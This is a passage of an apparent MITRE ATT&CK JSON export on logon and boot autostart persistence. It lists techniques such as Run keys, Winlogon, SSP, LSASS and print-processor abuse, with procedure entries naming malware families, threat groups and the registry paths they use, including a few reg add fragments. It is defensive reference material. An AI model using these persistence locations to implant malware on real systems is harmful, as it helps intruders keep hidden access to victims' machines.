                    },
                    "S0375": {
                        "ID": "S0375",
                        "Name": "Remexi",
                        "Description": "<name> utilizes Run Registry keys in the HKLM hive as a persistence mechanism.[226]"
                    },
                    "S0433": {
                        "ID": "S0433",
                        "Name": "Rifdoor",
                        "Description": "<name> has created a new registry entry at HKEY_CURRENT_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Graphics with a value of C:\\ProgramData\\Initech\\Initech.exe /run.[227]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name>'s miner has created UPX-packed files in the Windows Start Menu Folder.[228]"
                    },
                    "S0270": {
                        "ID": "S0270",
                        "Name": "RogueRobin",
                        "Description": "<name> created a shortcut in the Windows startup folder to launch a PowerShell script each time the user logs in to establish persistence.[229]"
                    },
                    "S0090": {
                        "ID": "S0090",
                        "Name": "Rover",
                        "Description": "<name> persists by creating a Registry entry in HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\.[230]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> tries to add a Registry Run key under the name \"Windows Update\" to establish persistence.[231]"
                    },
                    "G0048": {
                        "ID": "G0048",
                        "Name": "RTM",
                        "Description": "<name> has used Registry run keys to establish persistence for the <name> Trojan and other tools, such as a modified version of TeamViewer remote desktop software.[231][232]"
                    },
                    "S0253": {
                        "ID": "S0253",
                        "Name": "RunningRAT",
                        "Description": "<name> adds itself to the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence upon reboot.[109]"
                    },
                    "S0446": {
                        "ID": "S0446",
                        "Name": "Ryuk",
                        "Description": "<name> has used the Windows command line to create a Registry entry under HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence.[233]"
                    },
                    "S0085": {
                        "ID": "S0085",
                        "Name": "S-Type",
                        "Description": "<name> may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of Unique Identifier}.[234]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has established persistence by being copied to the Startup directory or through the \\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key.[235][236]"
                    },
                    "S0074": {
                        "ID": "S0074",
                        "Name": "Sakula",
                        "Description": "Most <name> samples maintain persistence by setting the Registry Run key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ in the HKLM or HKCU hive, with the Registry value and file name varying by sample.[237]"
                    },
                    "S0461": {
                        "ID": "S0461",
                        "Name": "SDBbot",
                        "Description": "<name> has the ability to add a value to the Registry Run key to establish persistence if it detects it is running with regular user privilege. [238][239]"
                    },
                    "S0053": {
                        "ID": "S0053",
                        "Name": "SeaDuke",
                        "Description": "<name> is capable of persisting via the Registry Run key or a .lnk file stored in the Startup directory.[240]"
                    },
                    "S0345": {
                        "ID": "S0345",
                        "Name": "Seasalt",
                        "Description": "<name> creates a Registry entry to ensure infection after reboot under HKLM\\Software\\Microsoft\\Windows\\currentVersion\\Run.[241]"
                    },
                    "S0382": {
                        "ID": "S0382",
                        "Name": "ServHelper",
                        "Description": "<name> may attempt to establish persistence via the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ run key.[242]"
                    },
                    "S0546": {
                        "ID": "S0546",
                        "Name": "SharpStage",
                        "Description": "<name> has the ability to create persistence for the malware using the Registry autorun key and startup folder.[169]"
                    },
                    "S0444": {
                        "ID": "S0444",
                        "Name": "ShimRat",
                        "Description": "<name> has installed a registry based start-up key HKCU\\Software\\microsoft\\windows\\CurrentVersion\\Run to maintain persistence should other methods fail.[243]"
                    },
                    "S0028": {
                        "ID": "S0028",
                        "Name": "SHIPSHAPE",
                        "Description": "<name> achieves persistence by creating a shortcut in the Startup folder.[40]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has added paths to executables in the Registry to establish persistence.[244][245][246]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has used HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, and the Startup folder to establish persistence.[247]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can establish a LNK file in the startup folder for persistence.[248]"
                    },
                    "S1035": {
                        "ID": "S1035",
                        "Name": "Small Sieve",
                        "Description": "<name> has the ability to add itself to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMicrosift for persistence.[249]"
                    },
                    "S0226": {
                        "ID": "S0226",
                        "Name": "Smoke Loader",
                        "Description": "<name> adds a Registry Run key for persistence and adds a script in the Startup folder to deploy the payload.[250]"
                    },
                    "S0649": {
                        "ID": "S0649",
                        "Name": "SMOKEDHAM",
                        "Description": "<name> has used reg.exe to create a Registry Run key.[251]"
                    },
                    "S1086": {
                        "ID": "S1086",
                        "Name": "Snip3",
                        "Description": "<name> can create a VBS file in startup to persist after system restarts.[252]"
                    },
                    "S0159": {
                        "ID": "S0159",
                        "Name": "SNUGRIDE",
                        "Description": "<name> establishes persistence through a Registry Run key.[253]"
                    },
                    "S0035": {
                        "ID": "S0035",
                        "Name": "SPACESHIP",
                        "Description": "<name> achieves persistence by creating a shortcut in the current user's Startup folder.[40]"
                    },
                    "S0058": {
                        "ID": "S0058",
                        "Name": "SslMM",
                        "Description": "To establish persistence, <name> identifies the Start Menu Startup directory and drops a link to its own executable disguised as an \"Office Start,\" \"Yahoo Talk,\" \"MSN Gaming Z0ne,\" or \"MSN Talk\" shortcut.[254]"
                    },
                    "S1037": {
                        "ID": "S1037",
                        "Name": "STARWHALE",
                        "Description": "<name> can establish persistence by installing itself in the startup folder, whereas the GO variant has created a HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookM registry key.[255][256]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> can use the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Registry key for persistence.[209]"
                    },
                    "S0018": {
                        "ID": "S0018",
                        "Name": "Sykipot",
                        "Description": "<name> has been known to establish persistence by adding programs to the Run Registry key.[257]"
                    },
                    "S0663": {
                        "ID": "S0663",
                        "Name": "SysUpdate",
                        "Description": "<name> can use a Registry Run key to establish persistence.[258]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has placed VBS files in the Startup folder and used Registry run keys to establish persistence for malicious payloads.[259]"
                    },
                    "S0011": {
                        "ID": "S0011",
                        "Name": "Taidoor",
                        "Description": "<name> has modified the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run key for persistence.[260]"
                    },
                    "S0586": {
                        "ID": "S0586",
                        "Name": "TAINTEDSCRIBE",
                        "Description": "<name> can copy itself into the current user\u2019s Startup folder as \"Narrator.exe\" for persistence.[261]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has added batch scripts to the startup folder.[262]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name>'s malware can add a Registry key to Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.[263][264]"
                    },
                    "S0665": {
                        "ID": "S0665",
                        "Name": "ThreatNeedle",
                        "Description": "<name> can be loaded into the Startup folder (%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrives.lnk) as a Shortcut file for persistence.[265]"
                    },
                    "S0131": {
                        "ID": "S0131",
                        "Name": "TINYTYPHON",
                        "Description": "<name> installs itself under Registry Run key to establish persistence.[41]"
                    },
                    "S0004": {
                        "ID": "S0004",
                        "Name": "TinyZBot",
                        "Description": "<name> can create a shortcut in the Windows startup folder for persistence.[266]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> establishes persistence in the Startup folder.[267]"
                    },
                    "S0094": {
                        "ID": "S0094",
                        "Name": "Trojan.Karagany",
                        "Description": "<name> can create a link to itself in the Startup folder to automatically start itself upon system restart.[38][268]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has created shortcuts in the Startup folder to establish persistence.[269][270]"
                    },
                    "S0178": {
                        "ID": "S0178",
                        "Name": "Truvasys",
                        "Description": "<name> adds a Registry Run key to establish persistence.[271]"
                    },
                    "S0647": {
                        "ID": "S0647",
                        "Name": "Turian",
                        "Description": "<name> can establish persistence by adding Registry Run keys.[272]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "A <name> Javascript backdoor added a local_update_check value under the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence. Additionally, a <name> custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.[171][273]"
                    },
                    "S0199": {
                        "ID": "S0199",
                        "Name": "TURNEDUP",
                        "Description": "<name> is capable of writing to a Registry Run key to establish.[274]"
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> has used Registry Run keys to establish automatic execution at system startup.[275][276]"
                    },
                    "S0136": {
                        "ID": "S0136",
                        "Name": "USBStealer",
                        "Description": "<name> registers itself under a Registry Run key with the name \"USB Disk Security.\"[277]"
                    },
                    "S0207": {
                        "ID": "S0207",
                        "Name": "Vasport",
                        "Description": "<name> copies itself to disk and creates an associated run key Registry entry to establish.[278]"
                    },
                    "S0442": {
                        "ID": "S0442",
                        "Name": "VBShower",
                        "Description": "<name> used HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\[a-f0-9A-F]{8} to maintain persistence.[279]"
                    },
                    "S0670": {
                        "ID": "S0670",
                        "Name": "WarzoneRAT",
                        "Description": "<name> can add itself to the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UIF2IS20VK Registry keys.[280]"
                    },
                    "G0112": {
                        "ID": "G0112",
                        "Name": "Windshift",
                        "Description": "<name> has created LNK files in the Startup folder to establish persistence.[281]"
                    },
                    "S0141": {
                        "ID": "S0141",
                        "Name": "Winnti for Windows",
                        "Description": "<name> can add a service named wind0ws to the Registry to achieve persistence after reboot.[282]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has established persistence via the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run and a shortcut within the startup folder.[283][284]"
                    },
                    "S0341": {
                        "ID": "S0341",
                        "Name": "Xbash",
                        "Description": "<name> can create a Startup item for persistence if it determines it is on a Windows system.[285]"
                    },
                    "S0251": {
                        "ID": "S0251",
                        "Name": "Zebrocy",
                        "Description": "<name> creates an entry in a Registry Run key for the malware to execute on startup.[286][287][288]"
                    },
                    "S0330": {
                        "ID": "S0330",
                        "Name": "Zeus Panda",
                        "Description": "<name> adds persistence by creating Registry Run keys.[289][290]"
                    },
                    "G0128": {
                        "ID": "G0128",
                        "Name": "ZIRCONIUM",
                        "Description": "<name> has created a Registry Run key named Dropbox Update Setup to establish persistence for a malicious Python binary.[291]"
                    }
                }
            },
            "002": {
                "name": "Authentication Package",
                "href": "/techniques/T1547/002",
                "description": "Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.[1]Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ with the key value of \"Authentication Packages\"=<target binary>. The binary will then be executed by the system when the authentication packages are loaded.",
                "Procedure": {
                    "S0143": {
                        "ID": "S0143",
                        "Name": "Flame",
                        "Description": "<name> can use Windows Authentication Packages for persistence.[2]"
                    }
                }
            },
            "003": {
                "name": "Time Providers",
                "href": "/techniques/T1547/003",
                "description": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.[1] W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.[2]Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\.[2] The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.[2]Adversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the DllName value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.[3]",
                "Procedure": {}
            },
            "004": {
                "name": "Winlogon Helper DLL",
                "href": "/techniques/T1547/004",
                "description": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\\Software[\\Wow6432Node\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon.[1] Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: [1]Winlogon\\Notify - points to notification package DLLs that handle Winlogon eventsWinlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs onWinlogon\\Shell - points to explorer.exe, the system shell executed when a user logs onAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",
                "Procedure": {
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can use Winlogon Helper DLL to establish persistence.[2]"
                    },
                    "S0351": {
                        "ID": "S0351",
                        "Name": "Cannon",
                        "Description": "<name> adds the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon to establish persistence.[3]"
                    },
                    "S1066": {
                        "ID": "S1066",
                        "Name": "DarkTortilla",
                        "Description": "<name> has established persistence via the Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon registry key.[4]"
                    },
                    "S0200": {
                        "ID": "S0200",
                        "Name": "Dipsind",
                        "Description": "A <name> variant registers as a Winlogon Event Notify DLL to establish persistence.[5]"
                    },
                    "S0168": {
                        "ID": "S0168",
                        "Name": "Gazer",
                        "Description": "<name> can establish persistence by setting the value \"Shell\" with \"explorer.exe, %malware_pathfile%\" under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.[6]"
                    },
                    "S0387": {
                        "ID": "S0387",
                        "Name": "KeyBoy",
                        "Description": "<name> issues the command reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" to achieve persistence.[7] [8]"
                    },
                    "S0375": {
                        "ID": "S0375",
                        "Name": "Remexi",
                        "Description": "<name> achieves persistence using Userinit by adding the Registry key HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit.[9]"
                    },
                    "S0379": {
                        "ID": "S0379",
                        "Name": "Revenge RAT",
                        "Description": "<name> creates a Registry key at HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell to survive a system reboot.[10]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has created the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell and sets the value to establish persistence.[11][12]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> established persistence by adding a Shell value under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.[13]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has established persistence using Userinit by adding the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.[14]"
                    }
                }
            },
            "005": {
                "name": "Security Support Provider",
                "href": "/techniques/T1547/005",
                "description": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.The SSP configuration is stored in two Registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.[1]",
                "Procedure": {
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can enumerate Security Support Providers (SSPs) as well as utilize PowerSploit's Install-SSP and Invoke-Mimikatz to install malicious SSPs and log authentication events.[2]"
                    },
                    "S0002": {
                        "ID": "S0002",
                        "Name": "Mimikatz",
                        "Description": "The <name> credential dumper contains an implementation of an SSP.[3]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name>'s Install-SSP Persistence module can be used to establish by installing a SSP DLL.[4][5]"
                    }
                }
            },
            "006": {
                "name": "Kernel Modules and Extensions",
                "href": "/techniques/T1547/006",
                "description": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.[1]\u00a0When used maliciously, LKMs can be a type of kernel-mode Rootkit that run with the highest operating system privilege (Ring 0).[2]\u00a0Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.[3]Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through kextload and kextunload commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.[4]Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.[5]Adversaries can use LKMs and kexts to conduct Persistence and/or Privilege Escalation on a system. Examples have been found in the wild, and there are some relevant open source projects as well.[6][7][8][9][10][11][12][13]",
                "Procedure": {
                    "S0502": {
                        "ID": "S0502",
                        "Name": "Drovorub",
                        "Description": "<name> can use kernel modules to establish persistence.[14]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, attackers used a signed kernel rootkit to establish additional persistence.[15]"
                    },
                    "S0468": {
                        "ID": "S0468",
                        "Name": "Skidmap",
                        "Description": "<name> has the ability to install several loadable kernel modules (LKMs) on infected machines.[13]"
                    }
                }
            },
            "007": {
                "name": "Re-opened Applications",
                "href": "/techniques/T1547/007",
                "description": "Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\".[1] When selected, all applications currently open are added to a property list file named com.apple.loginwindow.[UUID].plist within the ~/Library/Preferences/ByHost directory.[2][3] Applications listed in this file are automatically reopened upon the user\u2019s next logon.Adversaries can establish Persistence by adding a malicious application path to the com.apple.loginwindow.[UUID].plist file to execute payloads when a user logs in.",
                "Procedure": {}
            },
            "008": {
                "name": "LSASS Driver",
                "href": "/techniques/T1547/008",
                "description": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.[1]Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., Hijack Execution Flow), an adversary can use LSA operations to continuously execute malicious payloads.",
                "Procedure": {
                    "S0208": {
                        "ID": "S0208",
                        "Name": "Pasam",
                        "Description": "<name> establishes by infecting the Security Accounts Manager (SAM) DLL to load a malicious DLL dropped to disk.[2]"
                    },
                    "S0176": {
                        "ID": "S0176",
                        "Name": "Wingbird",
                        "Description": "<name> drops a malicious file (sspisrv.dll) alongside a copy of lsass.exe, which is used to register a service that loads sspisrv.dll as a driver. The payload of the malicious driver (located in its entry-point function) is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes.[3][4]"
                    }
                }
            },
            "009": {
                "name": "Shortcut Modification",
                "href": "/techniques/T1547/009",
                "description": "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.[1] Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.",
                "Procedure": {
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has modified LNK shortcuts.[2]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name>'s initial payload is a malicious .LNK file. [3][4]"
                    },
                    "S0031": {
                        "ID": "S0031",
                        "Name": "BACKSPACE",
                        "Description": "<name> achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.[5]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can establish persistence by writing shortcuts to the Windows Startup folder.[6][7]"
                    },
                    "S0089": {
                        "ID": "S0089",
                        "Name": "BlackEnergy",
                        "Description": "The <name> 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.[8]"
                    },
                    "S0244": {
                        "ID": "S0244",
                        "Name": "Comnie",
                        "Description": "<name> establishes persistence via a .lnk file in the victim\u2019s startup path.[9]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can persist by modifying a .LNK file to include a backdoor.[10]"
                    },
                    "S0267": {
                        "ID": "S0267",
                        "Name": "FELIXROOT",
                        "Description": "<name> creates a .LNK file for persistence.[11]"
                    },
                    "S0168": {
                        "ID": "S0168",
                        "Name": "Gazer",
                        "Description": "<name> can establish persistence by creating a .lnk file in the Start menu or by modifying existing .lnk files to execute the malware through cmd.exe.[12][13]"
                    },
                    "G0078": {
                        "ID": "G0078",
                        "Name": "Gorgon Group",
                        "Description": "<name> malware can create a .lnk file and add a Registry Run key to establish persistence.[14]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can write or modify browser shortcuts to enable launching of malicious browser extensions.[15]"
                    },
                    "S0170": {
                        "ID": "S0170",
                        "Name": "Helminth",
                        "Description": "<name> establishes persistence by creating a shortcut.[16]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can use a .lnk shortcut for the Control Panel to establish persistence.[17]"
                    },
                    "S0265": {
                        "ID": "S0265",
                        "Name": "Kazuar",
                        "Description": "<name> adds a .lnk file to the Windows startup folder.[18]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "A version of <name> drops a Windows shortcut on the victim\u2019s machine to establish persistence.[19]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> malware has maintained persistence on a system by creating a LNK shortcut in the user\u2019s Startup folder.[20]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.[21][22]"
                    },
                    "S0652": {
                        "ID": "S0652",
                        "Name": "MarkiRAT",
                        "Description": "<name> can modify the shortcut that launches Telegram by replacing its path with the malicious payload to launch with the legitimate executable.[23]"
                    },
                    "S0339": {
                        "ID": "S0339",
                        "Name": "Micropsia",
                        "Description": "<name> creates a shortcut to maintain persistence.[24]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name> can establish persistence by creating a .lnk shortcut to itself in the Startup folder.[25]"
                    },
                    "S0172": {
                        "ID": "S0172",
                        "Name": "Reaver",
                        "Description": "<name> creates a shortcut file and saves it in a Startup folder to establish persistence.[26]"
                    },
                    "S0153": {
                        "ID": "S0153",
                        "Name": "RedLeaves",
                        "Description": "<name> attempts to add a shortcut file in the Startup folder to achieve persistence.[27][28]"
                    },
                    "S0270": {
                        "ID": "S0270",
                        "Name": "RogueRobin",
                        "Description": "<name> establishes persistence by creating a shortcut (.LNK file) in the Windows startup folder to run a script each time the user logs in.[29][30]"
                    },
                    "S0085": {
                        "ID": "S0085",
                        "Name": "S-Type",
                        "Description": "<name> may create the file %HOMEPATH%\\Start Menu\\Programs\\Startup\\Realtek {Unique Identifier}.lnk, which points to the malicious msdtc.exe file already created in the %CommonFiles% directory.[31]"
                    },
                    "S0053": {
                        "ID": "S0053",
                        "Name": "SeaDuke",
                        "Description": "<name> is capable of persisting via a .lnk file stored in the Startup directory.[32]"
                    },
                    "S0028": {
                        "ID": "S0028",
                        "Name": "SHIPSHAPE",
                        "Description": "<name> achieves persistence by creating a shortcut in the Startup folder.[5]"
                    },
                    "S0035": {
                        "ID": "S0035",
                        "Name": "SPACESHIP",
                        "Description": "<name> achieves persistence by creating a shortcut in the current user's Startup folder.[5]"
                    },
                    "S0058": {
                        "ID": "S0058",
                        "Name": "SslMM",
                        "Description": "To establish persistence, <name> identifies the Start Menu Startup directory and drops a link to its own executable disguised as an \"Office Start,\" \"Yahoo Talk,\" \"MSN Gaming Z0ne,\" or \"MSN Talk\" shortcut.[33]"
                    },
                    "S0004": {
                        "ID": "S0004",
                        "Name": "TinyZBot",
                        "Description": "<name> can create a shortcut in the Windows startup folder for persistence.[34]"
                    }
                }
            },
            "010": {
                "name": "Port Monitors",
                "href": "/techniques/T1547/010",
                "description": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup.[1] This DLL can be located in C:\\Windows\\System32 and will be loaded and run by the print spooler service, spoolsv.exe, under SYSTEM level permissions on boot.[2] Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the Driver value of an existing or new arbitrarily named subkey of HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors. The Registry key contains entries for the following:Local PortStandard TCP/IP PortUSB MonitorWSD Port",
                "Procedure": {}
            },
            "012": {
                "name": "Print Processors",
                "href": "/techniques/T1547/012",
                "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot.[1]Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the AddPrintProcessor API call with an account that has SeLoadDriverPrivilege enabled. Alternatively, a print processor can be registered to the print spooler service by adding the HKLM\\SYSTEM\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\[Windows architecture: e.g., Windows x64]\\Print Processors\\[user defined]\\Driver Registry key that points to the DLL.For the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the GetPrintProcessorDirectory API call, or referenced via a relative path from this directory.[2] After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.[3]The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
                "Procedure": {
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has added the Registry key HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Print Processors\\UDPrint\" /v Driver /d \"spool.dll /f to load malware as a Print Processor.[4]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> can drop itself in C:\\Windows\\System32\\spool\\prtprocs\\x64\\winprint.dll to be loaded automatically by the spoolsv Windows service.[5]"
                    },
                    "S0501": {
                        "ID": "S0501",
                        "Name": "PipeMon",
                        "Description": "The <name> installer has modified the Registry key HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors to install <name> as a Print Processor.[3]"
                    }
                }
            },
            "013": {
                "name": "XDG Autostart Entries",
                "href": "/techniques/T1547/013",
